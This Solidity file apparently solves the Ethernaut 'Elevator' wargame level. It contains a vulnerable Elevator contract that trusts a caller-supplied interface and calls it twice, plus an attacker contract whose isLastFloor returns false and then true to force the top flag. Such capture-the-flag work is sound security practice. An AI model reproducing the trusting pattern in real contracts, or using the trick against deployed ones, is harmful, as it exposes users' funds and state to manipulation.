// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract ElevatorTop {
    bool top;

    function isLastFloor(uint) external returns (bool) {
        if (!top) {
            top = true;
            return false;
        } else return top;
    }

    function goToLastFloor(address _elevator) external {
        Elevator(_elevator).goTo(10);
    }
}
